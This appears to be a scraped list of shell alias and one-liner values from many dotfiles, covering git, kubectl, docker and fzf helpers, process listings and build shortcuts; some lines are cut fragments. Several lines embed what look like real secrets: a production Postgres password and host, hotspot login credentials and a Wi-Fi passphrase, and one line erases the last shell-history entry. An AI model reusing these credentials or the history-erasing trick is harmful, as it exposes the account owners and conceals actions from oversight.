"TMP_PATH_UPDATE=`pwd`; cd $(dirname `readlink ~/.profile`); git pull; git submodule init; git submodule update; cd $TMP_PATH_UPDATE; (([ `basename $SHELL` = ""bash"" ] && source ~/.bash_profile) || ([ `basename $SHELL` = ""zsh"" ] && source ~/.zshrc))"
"TMP=$(history | tail -1 | awk ""{print $1}"") && history -d $TMP"
"TERM=$(echo $TERM | sed -r ""s/^(xterm|screen).*/\1-256color/"") htop -d5"
"SS|uniq -c|sort -srn -k1,1"
"SPG_CONTAINER_ID=""$(docker container ps | grep spg | egrep -o ^[[:alnum:]]*)"""
"RANDOM=`od -vAn -N4 -tu4 < /dev/random`; smplayer ""$(find . -type f -size +100M | sed -n ""$(($[${RANDOM}%$(find . -type f -size +100M| wc -l)]+1))p"")"""
"RANDOM=RANDOM; smplayer ""$(ls | sed -n ""$(($[${RANDOM}%$(ls | wc -l)]+1))p"")"""
"RANDOM=RANDOM; feh ""$(ls -d $(find .)| sed -n ""$(($[${RANDOM}%$(ls -d $(find .) | wc -l)]+1))p"")"""
"RANDOM=RANDOM; feh ""$(ls -1| sed -n ""$(($[${RANDOM}%$(ls -1 | wc -l)]+1))p"")"""
"QUERY_PATH=/Users/juandaco/src/artimo-queries/; find ""$QUERY_PATH"" -name *.js -exec basename {} \; | cat ""$QUERY_PATH""""$(fzf)"" | pbcopy"
"Last_Commit=`git log | head -n 1 | cut -d"" "" -f2`; git revert $Last_Commit"
"LL=""ll.$(date +%F.%T)""; touch /tmp/""$LL""; ln -f /tmp/""$LL"" ~/ll; adb wait-for-device; adb logcat -c | grep permitted && (adb root; adb wait-for-device; adb logcat -c); adb logcat -v threadtime *:v | tee /tmp/""$LL"""
"LL=""$(date +%F.%T).logcat""; touch /tmp/""$LL""; ln -s /tmp/""$LL"" ""$LL""; adb wait-for-device; adb logcat -c | grep permitted && (adb root; adb wait-for-device; adb logcat -c); adb logcat -v time *:v | tee /tmp/""$LL"""
"LINE=`echo ""\\\$DIRS"" | sed -ne ""1p""`;[ ""\$LINE"" != """" ] && cd $LINE;DIRS=`echo ""\\\$DIRS"" | sed -e ""1d""`"
"LINE=$(ghq list -p | r2t | peco); gh-open ${LINE/""~""/$HOME}"
"LINE=$(ghq list -p | r2t | peco); cd ${LINE/""~""/$HOME}"
"LC_CTYPE=C LC_ALL=C tr -dc ""[:alnum:]"" < /dev/urandom | fold -w 50 | head -n 1"
"LC_COLLATE=C ls -la | grep ""^d"" && ls -la | grep -v ""^d"""
"LC_ALL=C tr -dc ""[[:alnum:]][[:punct:]]"" < /dev/urandom | fold -w 16 | head -n 10"
"LC_ALL=C tr -dc ""A-Za-z0-9_!@#$%^&*()\-+="" < /dev/urandom | fold -w 20 | head -n 4"
"LC_ALL=C tr -c ""[:digit:]"" "" "" < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR=""1;32"" grep --color ""[^ ]"""
"LC_ALL=C sudo ps -o time,ppid,pid,nice,pcpu,pmem,user,comm -A | sort -n -k 6 | tail -15"
"LANG=en_US.UTF-8 /usr/bin/mosh --server=""LANG=en_US.UTF-8 mosh-server"" -- dockstar sh -c ""tmux attach-session -t irssi || tmux new-session -s irssi irssi"""
"IP=$(dig +short -6 myip.opendns.com aaaa @resolver1.opendns.com 2> /dev/null) && echo ""IPv6: $IP"" || echo ""IPv6: down"""
"IP=$(dig +short -4 myip.opendns.com a @resolver1.opendns.com 2> /dev/null) && echo ""IPv4: $IP"" || echo ""IPv4: down"""
"GPF=""git push --delete origin $(git branch | awk ""/^\* /{print \$2}"") && git push"" && echo ""This will do \""$GPF\"""" && read -p ""Are you really sure you want to do this? [yes/NO] "" && [[ ${REPLY^^} =~ ^(Y|YES)$ ]] && eval $GPF"
"GIT_MERGE_AUTOEDIT=no git flow feature finish $(git flow feature list | grep ""*"" | cut -f 2 -d "" "" )"
"EXP_DATE=$(date +""%Y%m%d_%H%M"") && echo PGPASSWORD=""skjdh5ho3SS2DFa2234@#"" pg_dump -h starterdb.cjjdjqckexfe.eu-west-1.rds.amazonaws.com -d ""clearwater@radiantfleet"" -U ""clearwater@owner"" --format=custom --file /home/ubuntu/cw_prod_$(echo $EXP_DATE).db --verbose | ssh cwbuild bash -s && scp cwbuild:/home/ubuntu/cw_prod_$(echo $EXP_DATE).db $HOME/Downloads/ && echo rm -rf /home/ubuntu/cw_prod_$(echo $EXP_DATE).db | ssh cwbuild bash -s"
"DATE=$(date +""%Y-%m-%d-%H-%M""); tshark -w /var/www/html/fs/capture-$DATE.pcap || chown freeswitch:freeswitch /var/www/html/fs/capture-$DATE.pcap && chmod 777 /var/www/html/fs/capture-$DATE.pcap"
"ChaeckHotspotInternetConnection; curl -s -d ""password=c7187c42b3be68cde72b2b4e2bb37a4c&username=9412101099"" -X POST https://hotspot.um.ac.ir/login > /dev/null && printf ""\e[33;1m%s\n\e[0m"" ""User Shahla Logged In"" || printf ""\e[31;1m%s\n\e[0m"" ""Could not resolve host: hotspot.um.ac.ir"""
"ChaeckHotspotInternetConnection; curl -s -d ""password=c4c696ae0e63a98932e25c6f64bde5a8&username=9412101168"" -X POST https://hotspot.um.ac.ir/login > /dev/null && printf ""\e[33;1m%s\n\e[0m"" ""User Hamid Logged In"" || printf ""\e[31;1m%s\n\e[0m"" ""Could not resolve host: hotspot.um.ac.ir"""
"CUR_BRANCH=`git branch | grep \* | cut -d "" "" -f2` && git push --set-upstream origin $CUR_BRANCH"
"CUR_BRANCH=`git branch | grep \* | cut -d "" "" -f2` && git checkout master && git branch -d $CUR_BRANCH"
"CUR=`__git_ps1 | sed -e ""s/(//"" | sed -e ""s/)//""`; git checkout master && git pull && git checkout -B $CUR"
"Branch| grep \* | cut -d"" "" -f2;"
"BRANCH=${1:-$(git branch | grep ""*"" | cut -c3-)}; git pull origin +$BRANCH:$BRANCH"
"ASHDIRSLINE=`echo ""\$ASHDIRSTACK"" | sed -ne ""1p""`;[ ""$ASHDIRSLINE"" != """" ] && cd $ASHDIRSLINE; ASHDIRSTACK=`echo ""\$ASHDIRSTACK"" | sed -e ""1d""`"
"=squeue -o %u:%D:%b | tail -n+2 | awk -F ':' '{a[\$1]+=\$2*\$NF} END {for (i in a) {print i, a[i]; s+=a[i];} print \"
"< /dev/urandom | tr -dc ""a-zA-Z0-9"" | head -c32; echo"
"< /dev/urandom | tr -dc ""a-zA-Z0-9"" | head -c32"
"; return 0; }; bl_exception_try_wrapper ""$@""; bl.exception.exit_try $? || "
"2>&1 | grep --color -E ""$(pwd).*|\$"""
"/volume/enterprise-sw/bin/show-all-free-pvl-hw.pl | egrep ""(A20|A40)"""
"/usr2/agrawals/.linuxbrew/bin/buildkernel -f | tail --line=5 |
"/usr/sysv/bin/ps -${PsWw}eA -o user,pid,ppid,pcpu,pmem,rss,vsz,time,tty,args | sort -k10 -k 3 -k2 | egrepi -E"
"/usr/local/mysql/bin/mysql $(cat ~/db_hosts||awk ""{printf(\""-h%s -u%s -p%s %s\"",\$3,\$4,\$5,\$6,\$2)}"")"
"/usr/local/mysql/bin/mysql $(cat ~/db_hosts|peco|awk ""{printf(\""-h%s -u%s -p%s %s\"",\$3,\$4,\$5,\$6,\$2)}"")"
"/usr/local/bin/tag-increment && git branch | sed -n ""/\* /s///p"" | xargs git push origin --follow-tags"
"/usr/local/bin/qdel `/usr/local/bin/mshow | grep syoung | cut -c 1,2,3,4,5,6`"
"/usr/lib/update-notifier/update-motd-reboot-required || echo ""No Update Needed"""
"/usr/bin/vim $(git status --porcelain | sed -ne ""s/^ M //p"" | xargs)"
"/usr/bin/netctl list | grep -n """" | column -t -s :"
"/usr/bin/find . | grep ""etx"" | grep "
"/usr/bin/find . | grep ""eti"" | grep "
"/usr/bin/diff -u <(git rev-list --first-parent master) <(git rev-list --first-parent HEAD) | sed -ne ""s/^ //p"" | head -1"
"/tmp/go_c.out 2>/dev/null || echo ""no file"""
"/sbin/ifconfig -a | egrep ""inet |^[a-z]"""
"/home/shared/ffmpeg-01-28-13/./ffmpeg -s video_size $(xrandr | awk '/, current /{print $8}')x$(xrandr | awk '/, current /{gsub(/\,/,"
"/home/shared/ffmpeg-01-28-13/./ffmpeg -s $(xrandr | awk '/, current /{print $8}')x$(xrandr | awk '/, current /{gsub(/\,/,"
"/home/scp1/dev/Term-ExtendedColor/bin/colored_dmesg|/bin/grep -viP ""TCP|ipv6"""
"/home/manu/Config/bin/df -hT |egrep -i ""file|^/"""
"/c/Logiciels/Notepad++/notepad++.exe ""/c/NDU90045/Desktop/EazyBI/1- EazyBIConfigDataSource-v1.0.1.js"" ""/c/NDU90045/Desktop/EazyBI/1- Liste Référent Trigramme - Full Name - v1.1.txt"" 2>/dev/null || true &"
"/bin/ps -eo pmem,pcpu,vsize,pid,cmd | sort -k 1 -nr | head -10"
"/bin/ps -eo pcpu,pid,user,args | sort -k 1 -r | head -10"
"/bin/ls -R | grep "":$"" | sed -e "
"/bin/ls -Fd .[A-Z][a-z]* err.txt generated.file succ.txt | grep / | sed -e ""s,/$,,"""
"/bin/ls -F | grep / | sed -e ""s,/$,,"""
"/bin/ls -1t ~/Downloads/viewer*.jnlp* ~/Downloads/vkvm*.jnlp* 2>/dev/null | head -n1 | xargs -I{} -t javaws ""{}"""
"/bin/ls --group-directories-first --width=$((echo 120; echo $(tput col)) | sort -n | head -1) --color=tty --hide ""*.Rproj"" --hide ""*.nb.html"" --hide ""samtools.*.tmp.*.bam"""
"/bin/findmnt -rnuc -o SOURCE,TARGET,FSTYPE,OPTIONS | sort | column -t"
"//"" | sed ""s/'//g"" | sed ""s/;.*//"")"
"./toolchains/aarch32/bin/arm-linux-gnueabihf-gcc --version | grep ""GNU Toolchain"" && ./toolchains/aarch64/bin/aarch64-linux-gnu-gdb --version | grep ""GNU Toolchain"""
"./setup.py test && notify-send ""Tests successful"" || notify-send ""Tests failed"""
".*|export alias python=python3.6|"" $HOME/.bashrc"
".*|export alias python=$python_ver|"" $HOME/.bashrc"
".*|alias snpEff.jar='java \-jar $snpeff_dir/snpEff.jar'|"" ~/.bashrc"
".*|alias ll='ls -alhF'|"" ~/.bashrc"
".*|alias SnpSift.jar='java \-jar $snpsift_dir/SnpSift.jar'|"" ~/.bashrc"
".*|$newline|"" ~/.bashrc"
".*/\1/p'|grep ""=""|sed -nr 's/(.*)=.*/\1/p')"
".*$|${docker_alias}|"" $profile_file \"
"-t ""tmux att || (sleep 2 && tmux new)"""
"-t ""reset; sudo varnishlog | egrep --color \""(RxStatus|TxStatus)\"""""
"-paginate tree -C -a -I "".git|__pycache__|lost+found"""
"*$"" ~/.profile.d/*.bash | grep ""^# "" | awk '{out=substr($2,0,length($2)-1)} { print out }' )"
"(tvr & nmrz; sleep 1; wmctrl -a ""Top Expanded Edge Panel"" || /usr/NX/bin/nxplayer &>/dev/null & disown -h)"
"(test -n ""\!*"" && sacctmgr list assoc user=\!* format=Cluster,Account,Partition,QOS%40) || echo No User Specified"
"(test -n ""\!*"" && sacct -u \!* --format=JobID,Priority,JobName,Account,QOS,Partition,Start,Elapsed,State) || echo No User specified"
"(test ""x"" != ""x\!*"") && ls `(apparix --try-current-first -favour rOl \!* || echo -n /dev/null)`"
"(sudo nmrz; sleep 1; wmctrl -a ""Top Expanded Edge Panel"" || /usr/NX/bin/nxplayer &>/dev/null & disown -h)"
"(setopt globdots;du -ks err.txt generated.file succ.txt | sort -nr | sed -e 's/^\([0-9]\{1,\}\)[0-9]\{6\}[^0-9]/\1G\t/;t;s/^\([0-9]\{1,\}\)[0-9]\{3\}[^0-9]/\1M\t/;t;d')"
"(rm npm-shrinkwrap.json || echo ""no npm-shrinkwrap.json to remove"") && ncu -u -a"
"(nvidia-docker start mlenv ||
"(npm install &> npm.log && terminal-notifier -title ""npm"" -message ""Install has finished!"" -sound default) || terminal-notifier -title ""npm"" -message ""Install has failed"" -sound default"
"(ifconfig | awk ""/inet/ { print $2 } "" | sed -e s/addr://)"
"(glg;echo)|tac|sed ""s/\\\\/\`/g; s/\//\\\/g; s/\`/\//g;"""
"(git push origin $(git_current_branch) &>/dev/null && notify-send ""pushed succesfully"" || notify-send ""push failed!"") & disown"
"(git pull && test ""$(git for-each-ref --format=""%(if)%(HEAD)%(then)%(push:track)%(end)"" refs/heads)"" != """" && git push || echo ""Nothing to push on this branch."") && test ""$(git for-each-ref --format=""%(push:track)"" refs/heads)"" != """" && (echo ""Other branches:""; ggu)"
"(git branch --merged | grep -v ""\*"" | xargs -n 1 git branch -d)"
"(git branch --merged master | grep -v ""master$"" | xargs git branch -d) && git remote prune origin"
"(for i in `git for-each-ref --sort=-committerdate --format=""%(refname:short)"" refs/heads/` ; do echo $i ; done) | tail -n 10 | xargs git branch -D"
"(for i in `git branch | colrm 1 2` ; do echo `git log --date=iso8601 -n 1 --pretty=""format:[%ai] %h"" $i` $i ; done) | sort -r"
"(for i in `git branch -r | colrm 1 2` ; do echo `git log --date=iso8601 -n 1 --pretty=""format:[%ai] %h"" $i` $i ; done) | sort -r"
"(for i in `git branch -a | colrm 1 2` ; do echo `git log --date=iso8601 -n 1 --pretty=""format:[%ai] %h"" $i` $i ; done) | sort -r"
"(for i in .*; do echo $(find $i -type f | wc -l) ""\t$i""; done) | sort -n'"
"(for i in .*; do echo $(find $i -type f | wc -l) ""\t$i""; done) | sort -n"
"(for i in err.txt generated.file succ.txt .*(N); do echo $(find $i -type f | wc -l) ""\t$i""; done) | sort -n'"
"(for i in err.txt generated.file succ.txt .*(N); do echo $(find $i -type f | wc -l) ""\t$i""; done) | sort -n"
"(for FILE in *.flac ; do ffmpeg -i ""$FILE"" -f mp3 -ab 192000 ""`basename ""$FILE"" .flac`.mp3"" || break; done)"
"(enscript -p - -f ""Helvetica@12"" -B | ps2pdf - - | zathura -)"
"(egrep -i "".*\!*"" ~/.didlist|grep -v GETDID|tail -40)"
"(echo `__git_ps1` | cut -d ""("" -f2 | cut -d "")"" -f1)"
"(echo ""Proto Recv-Q Send-Q Local-Address Foreign-Address State User Inode PID/Program-name""; netstat -eev --wide -pa --numeric-ports -u 2>/dev/null | tail -n +3) | column -t"
"(echo ""Proto Recv-Q Send-Q Local-Address Foreign-Address State User Inode PID/Program-name""; netstat -eev --wide -pa --numeric-ports -tu 2>/dev/null | tail -n +3) | column -t"
"(echo ""Proto Recv-Q Send-Q Local-Address Foreign-Address State User Inode PID/Program-name""; netstat -eev --wide -pa --numeric-ports -t 2>/dev/null | tail -n +3) | column -t"
"(echo ""Proto Recv-Q Send-Q Local-Address Foreign-Address State User Inode PID/Program-name""; lstcp | grep -e "":80"" -e "":443"") | column -t"
"(echo ""GPU,temp, clocks, pstate, power, util.GPU, util.MEM, freeMEM"" && __nvq | nl -s, -w1 -v0) | column -t -s,"
"(dumpkeys | grep keymaps; echo ""keycode 58 = Control"") | loadkeys"
"(dist-upgrade && apt-file update && config-up && success ""dist upgrade"") || fail ""dist upgrade"""
"(cp -f ~/.bak/.vimrc ~/ && success ""vimrc downgrade"") || fail ""vimrc downgrade"""
"(cp -f ~/.bak/.screenrc ~/ && success ""screenrc downgrade"") || fail ""screenrc downgrade"""
"(cp -f ~/.bak/.bashrc ~/ && success ""bashrc downgrade"") || fail ""bashrc downgrade"""
"(cp -f ~/.bak/.bash_aliases ~/ ; source ~/.bash_aliases && success ""alias downgrade"") || fail ""alias downgrade"""
"(cd ~/catkin_rdv && rm -rf /build/rdv_pipeline && catkin_make -DCATKIN_WHITELIST_PACKAGES="""" CMAKE_BUILD_TYPE=""Release"" -j2) || cd -"
"(cd ~/catkin_rdv && catkin_make CMAKE_BUILD_TYPE=""Release"" -j3) || cd -"
"(cd ~/catkin_rdv && catkin_make -DCATKIN_WHITELIST_PACKAGES=""rdv_planning"" -j2) || cd -"
"(cd ~/catkin_rdv && catkin_make -DCATKIN_WHITELIST_PACKAGES="""" -j3) || cd -"
"(cd ~/catkin_rdv && catkin_make -DCATKIN_BLACKLIST_PACKAGES="""" -j3) || cd -"
"(cd ~/atc-archive && vlc --rate=1.5 $(rsync -arv -e ""ssh root@home.danmilon.me ssh danmilon@rtlsdr-atc-1.danmilon.node.her.wn"" :/home/danmilon/atc-archives/ ~/atc-archive/ | tee -a /dev/tty ~/tmp/atc | sort-atc-archives))"
"(cd ~/atc-archive && vlc --rate=1.5 $(rsync -arv -e ""ssh danmilon@rtlsdr-atc-1.danmilon.node.her.wn"" :/home/danmilon/atc-archives/ ~/atc-archive/ | tee -a /dev/tty ~/tmp/atc | sort-atc-archives))"
"(cd ~/.tmux && git pull) && (cd ~/.vim_runtime && git pull) && (cd ~/.dotfiles && git pull) && (cd ~/.hammerspoon && git pull) && brew update && brew upgrade && brew cask outdated | awk -F "" "" ""{print $1}"" | xargs brew cask install --force && brew cleanup"
"(cd .w >& /dev/null && see) && cd .w >& /dev/null || echo ""You cannot go that way."""
"(cd .sw 2>/dev/null && see) && cd .sw >& /dev/null || echo ""You cannot go that way."""
"(cd .se 2>/dev/null && see) && cd .se >& /dev/null || echo ""You cannot go that way."""
"(cd .s 2>/dev/null && see) && cd .s >& /dev/null || echo ""You cannot go that way."""
"(cd .nw 2>/dev/null && see) && cd .nw >& /dev/null || echo ""You cannot go that way."""
"(cd .e >& /dev/null && see) && cd .e >& /dev/null || echo ""You cannot go that way."""
"(cd $SC_ROOT > /dev/null; svn status | grep ""^[MA]"" | sed -e ""s/^[AM][ +]*//"")"
"(cat \!* | tr -s '\'' .,;:?\!()[]""'\'' '\''\012'\'' |' \"
"(cat /var/log/apt/history.log; zcat -q `ls -1 -t /var/log/apt/history.log.*.gz`) | sed -n ""/^Start-Date/{N;s/\n/ /;p}"" | tac"
"(cat /etc/hosts_static ; lxc cat /etc/hosts | tail -n +8) | sudo bash -c ""cat > /etc/hosts"""
"(ag -alL ""\\\$scope"" tmp/cache/assets/development/sprockets | xargs ag -al templateCache.put | xargs rm) && ttr"
"(abduco -n WaiFai sudo create_ap --hidden --no-virt --dhcp-dns 8.8.8.8,8.8.4.4 wlan0 eth0 WaiFai wayifive) || (abduco -A WaiFai sudo create_ap --hidden --no-virt --dhcp-dns 8.8.8.8,8.8.4.4 wlan0 eth0 WaiFai wayifive)"
"(__git_ps1 ""%s"") | pbcopy | (__git_ps1 ""%s"")"
"(__f() { fc -ln | tail -n 1 | sed -E ""s@^\s+@@g""; }; echo -e ""\`\`\`bash\n$ $(__f)\n$(eval $(__f))\n\`\`\`"")"
"([[ $(git config ""branch.$(git rev-parse --abbrev-ref HEAD).merge"") = """" ]] && git push -u) || git push"
"([[ ! -d ""Source"" ]] && start *.sln) || start Source/*.sln"
"([ -z ""$(docker images -q -f dangling=true)"" ] && echo ""No dangling images"") || (echo ""Removing dangling images"" && docker rmi $(docker images -q -f dangling=true))"
"([ -r ""$(git rev-parse --show-toplevel)/.git/lazycommit"" ] || (echo ""non-lazy repo, aborting""; false )) && git commit -a -v -m ""$(date)"""
"([ -f tags ] && echo ""Preparing tags"" && ctags -R || true)"
"([ ""$TERM"" = screen ] && echo ""YOU ARE IN A SCREEN SESSION - ALT-D to exit if you really want to."") || exit"
"(){ps -ax -o ""pid, command"" | grep --color=always ""$1"" | grep -v "" grep ""}"
"(){git remote get-url origin | sed -e ""s#:#/#"" -e ""s#git@#https://#"" -e ""s/\.git$//"" | xargs -I@ open @/compare/$1...`git rev-parse --abbrev-ref HEAD 2>/dev/null`}"
"(){find . -type f | xargs -I{} sh -c ""echo {}; cat {} | grep $1"" }"
"(){ ps -eo pid,ppid,pgid,sig,sigmask,nsigs,command |egrep ""COMMAND|$1"" }"
"(){ kubectl exec -it $(kubectl get pods -oname | sed -E ""s/pod\///g"" | fzf) $@ }"
"(){ hub browse $(ghq list | peco --query ""$*"" | cut -d ""/"" -f2,3) }"
"(){ hub browse $(ghq list | peco --query ""$*"" | cut -d ""/"" -f 2,3) }"
"(){ find $1 -type f -print | xargs grep -l ""$2"" | xargs sed -i """" ""s/$2/$3/g"" }"
"(){ TARGETBRANCH=`git branch|sed ""s/ *//g""|fzf`; if [ -n ${TARGETBRANCH} ]; then git checkout $TARGETBRANCH; unset TARGETBRANCH; fi }"
"() { vim -c ""exe \""PluggerLoad man\"" | Man $1 | only"" }"
"((printf ""## "" ; date | cut -d "" "" -f 1-3) | pbcopy; cd ~/github/my/projects/; vim log.md; git add log.md; git commit -m ""Update log""; git push)"
"((l2=l+1));if [[ $f -eq 1 ]];then f=;t=`echo $h|cut -f$l -d:`;else f2=1;if [ ""$la"" != ""$PWD"" ]; then h=$PWD:`echo $h|cut -f$l2- -d:`;la=$PWD;fi;l=0;t=;fi;cd $t"
"(( IS_DIRTY == 0 )) && print -- ""clean "" || cleanup ""success"""
"(( $+TMUX )) && tmux send-keys -R \; clear-history || echo -ne ""\033c"""
"( { git push &>/tmp/gitpush_$(basename $(pwd))_$(date +""%T"") || { tput setaf 1 ; tput bold ; echo push failed !!!!!!!!!!!!!!!! ; } ; } & )"
"( httpd_pids=`pgrep -u $USER,root httpd` ; [ ! ""$httpd_pids"" ] || ps -H u -p $httpd_pids )"
"( httpd_pids=`pgrep -u $USER,ppr,noukpo,root httpd` ; [ ! ""$httpd_pids"" ] || ps -H u -p $httpd_pids )"
"( echo ""To: ""; echo ""Subject: ""; echo; echo; ) | vipe | msmtp -t"
"&& notify-send -u critical ""\(^o^)/"" --expire-time=1000 || notify-send ""(╯°□°）╯︵ ┻━┻"""
"${INSTALLER} -Qei $(pacman -Q|cut -d"" "" -f 1)|awk "" BEGIN {FS=\"":\""}/^Name/{printf(\""\033[1;36m%s\033[1;37m\"", \$2)}/^Description/{print \$2}"""
"$user user_pwd=$user_pwd"" || exit 1"
"$RTINCOMPLETEDIR/*"" is_complete=yes -Q1 | sed ""s#SELECTED.*NAME.*ALIAS# #; s#\(.*\) \[SUM of.*#$RTLISTSUMMSGSTUCK: \1#"" | grep -v -e 'MIN of' -e 'MAX of' -e 'AVG of'"
"$EDITOR `git status --porcelain | grep ""UU"" | tr -d ""UU ""`"
"$EDITOR $(fasd -f | awk ""{print \$2}"" | fzf --tac --no-sort --multi)"
"$2"" | cut -d""="" -f 2 | head -1)"
"$(which wget || echo ""curl -O"")"
"$(which gls > /dev/null && echo gls || echo ls)"" -Fl --group-directories-first --time-style=\""+""$(cursor_backward 1)""\"""""
"$(which find) . -follow -printf """" 2>&1 | egrep -w ""loop|denied"""
"$(terraform state list | fzf-tmux --header-lines=1 --reverse --multi --cycle | awk ""{print \$1}"")"
"$(system_profiler SPHardwareDataType | grep ""Model Identifier"" | awk '{ print $3; }')"
"$(system_profiler SPFontsDataType | grep -i ""Full Name"" | awk '{$1=$2=""""; print $0}')"
"$(rake -T | peco | sed -e ""s/#.*//"" )"
"$(pwd | sed ""s/.*cmtuser\/\([^\/]*\)_\([^\/]*\).*/\1 \2/"" | sed ""s/Dev//"" )"
"$(pwd | awk -F\/ '{print $(NF-1),$(NF)}' | sed ""s/ /\\//"" )"
"$(ps | peco --prompt ""PS LIST>"" | getvalue 1)"
"$(ps x -o pid,command | fzf --multi --prompt ""Processes> "" | awk ""{print \$1}"")"
"$(ps aux | peco --prompt ""PS LIST>"" | getvalue 2)"
"$(make rinfo | grep ""redismobile server"" | perl -F""\s+-\s+"" -nale ""print @F[0]"")"
"$(make rinfo | grep ""redis payment api server"" | perl -F""\s+-\s+"" -nale ""print @F[0]"")"
"$(make rinfo | grep ""redis link manager server"" | perl -F""\s+-\s+"" -nale ""print @F[0]"")"
"$(make rinfo | grep ""redis favorites server"" | perl -F""\s+-\s+"" -nale ""print @F[0]"")"
"$(make rinfo | grep ""redis accounts server"" | perl -pe ""s/ - redis accounts server//g"")"
"$(make -C ~/bomnegocio rinfo | grep ""redismobile server"" | perl -F""\s+-\s+"" -nale ""print @F[0]"")"
"$(make -C ~/bomnegocio rinfo | grep ""redis payment api server"" | perl -F""\s+-\s+"" -nale ""print @F[0]"")"
"$(make -C ~/bomnegocio rinfo | grep ""redis link manager server"" | perl -F""\s+-\s+"" -nale ""print @F[0]"")"
"$(make -C ~/bomnegocio rinfo | grep ""redis favorites server"" | perl -F""\s+-\s+"" -nale ""print @F[0]"")"
"$(make -C ~/bomnegocio rinfo | grep ""redis accounts server"" | perl -pe ""s/ - redis accounts server//g"")"
"$(kubectl get svc | peco | awk ""{print \$1}"")"
"$(kubectl get svc | fzfkubernetesalias | awk ""{print \$1}"")"
"$(kubectl get svc | fzf-tmux --header-lines=1 --reverse --multi --cycle | awk ""{print \$1}"")"
"$(kubectl get rs | peco | awk ""{print \$1}"")"
"$(kubectl get rs | fzfkubernetesalias | awk ""{print \$1}"")"
"$(kubectl get rs | fzf-tmux --header-lines=1 --reverse --multi --cycle | awk ""{print \$1}"")"
"$(kubectl get pods | peco | awk ""{print \$1}"")"
"$(kubectl get pods | fzfkubernetesalias | awk ""{print \$1}"")"
"$(kubectl get pods | fzf-tmux --header-lines=1 --reverse --multi --cycle | awk ""{print \$1}"")"
"$(kubectl get pods | fzf | awk ""{print \$1}"")"
"$(kubectl get pods -oname | sed -E ""s/pod\///g"" | fzf --height=50% --header=pods)"
"$(kubectl get po | peco | awk ""{print \$1}"")"
"$(kubectl get po | fzf | awk ""{print \$1}"")"
"$(kubectl get ns | fzfkubernetesalias | awk ""{print \$1}"")"
"$(kubectl get ing | peco | awk ""{print \$1}"")"
"$(kubectl get ing | fzfkubernetesalias | awk ""{print \$1}"")"
"$(kubectl get ing | fzf-tmux --header-lines=1 --reverse --multi --cycle | awk ""{print \$1}"")"
"$(kubectl get ds | peco | awk ""{print \$1}"")"
"$(kubectl get deploy| fzf-tmux --header-lines=1 --reverse --multi --cycle | awk ""{print \$1}"")"
"$(kubectl get deploy | peco | awk ""{print \$1}"")"
"$(k get po | peco | awk ""{print \$1}"")"
"$(hk apps | cut -d "" "" -f 1 | peco)"
"$(git status -s -uno | peco --query ""$*"" | awk ""{print \$2}"")"
"$(git status --short | fzf-git-rspec | fzf --multi --preview=""git diff --color=always {}"" --prompt ""Changed RSpec>"")"
"$(git status --short | fzf --multi --preview ""sh -c \""echo {} | awk "
"$(git status --porcelain | peco | awk ""{print \$NF}"")"
"$(git log --reverse --pretty=oneline --abbrev-commit -20 | fzf +s --prompt=""fixup> "" | awk "
"$(git log --reverse --pretty=oneline --abbrev-commit -10 | fzf +s --prompt=""fixup> "" | awk "
"$(git log --oneline | fzf --multi --no-sort --preview ""sh -c \""git --no-pager show \\\$(echo {} | awk "
"$(git log --oneline --topo-order --decorate -n100 | fzf --reverse | cut -d"" "" -f1)"
"$(git log --oneline --branches | peco | cut -d"" "" -f1)"
"$(git log --oneline --branches | peco | awk ""{print $1}"")"
"$(git log --oneline --branches | fzf --prompt ""GIT HASH>"" | awk ""{print \$1}"")"
"$(git diff-index --name-only HEAD | fzf | xargs -n1 printf ""%s/%s\n"" $(git root))"
"$(git branch | peco | sed -e ""s/^\*[ ]*//g"")"
"$(git branch | peco | sed -e ""s/^\*[ ]*//"")"
"$(git branch | grep -Ev ""^\*"" | peco --layout bottom-up --prompt ""GIT BRANCH> "")"
"$(git branch | fzf | sed ""s/\*//"")"
"$(git branch | fzf --multi --prompt ""Local Branches> "" | sed -e ""s/^\*\s*//g"")"
"$(git branch -r | sed ""s/origin\///"" | fzf +s +m)"
"$(git branch -r | fzf --multi --prompt ""Remote Branches> "" | sed -e ""s/^\*\s*//g"")"
"$(git branch -a | fzf --prompt ""GIT BRANCH>"" | sed -e ""s/^\*\s*//g"")"
"$(git branch -a | fzf --multi --preview ""git show {1}"" --prompt ""All Branches> "" | sed -e ""s/^[\*\+]\s*//g"")"
"$(git branch --no-color | grep ""*"" | sed ""s/* //"")"
"$(git branch --all | awk ""{sub(/^[ \*] /, \""\"");print \$1}"" | peco)"
"$(git branch --all --sort creatordate | fzf-tmux --header-lines=1 --reverse --multi --cycle | awk ""{print \$1}"")"
"$(fd "".*gpg"" ~/.password-store/ | sed ""s$.*\.password-store/\(.*\)\.gpg$\1$"" | fzf --preview=""pass show {}"")"
"$(fc -nl -1) |tr -d ""\n"" |pbcopy"
"$(fc -ln -2 | head -1 | sed ""1s/^[[:space:]]*//"")"
"$(echo fspymethod,fspyclass,fspyclassreference |tr "","" ""\n""|fzf --height 10%)"
"$(echo $dirstack | sed ""s@ @\n@g"" |peco)"
"$(docker ps -a | peco --prompt ""DOCKER PS LIST>"" | getvalue 1)"
"$(docker ps -a | fzf-tmux --header-lines=1 --reverse --multi --cycle | awk ""{print \$1}"")"
"$(docker ps -a | fzf --multi --prompt ""Docker containers> "" | awk ""{print \$1}"")"
"$(docker images | peco --prompt ""DOCKER IMAGES LIST>"" | getvalue 3)"
"$(docker images | fzf-tmux --header-lines=1 --reverse --multi --cycle | awk ""{print \$1 \"":\"" \$2}"")"
"$(docker images | fzf --multi --prompt ""Docker images> "" | awk ""{print \$3}"")"
"$(basename ""$(test -L ""$0"" && readlink ""$0"" || echo ""$0"")"")"
"$(aws ec2 describe-instances --filters ""Name=tag:Name,Values=ansible-control"" | grep InstanceId | cut -d '""' -f4)"
"$([[ $family=""bsd"" ]] && echo 'dscacheutil -flushcache' || echo 'nscd -i hosts') # flushDNS: Flush out the DNS Cache"
"$([[ $family == ""bsd"" ]] && echo '\ls -GF' || echo '\ls --color=auto -F')"
"$( kubectl get svc | fzf-tmux --header-lines=1 --reverse --multi --cycle | awk ""{print \$1}"")"
"$( kubectl get rs | fzf-tmux --header-lines=1 --reverse --multi --cycle | awk ""{print \$1}"")"
"$( kubectl get pods | fzf-tmux --header-lines=1 --reverse --multi --cycle | awk ""{print \$1}"")"
"$( kubectl get ing | fzf-tmux --header-lines=1 --reverse --multi --cycle | awk ""{print \$1}"")"
"$'sort -r | awk \'a!~""^""$0{a=$0;print}\' | sort'"
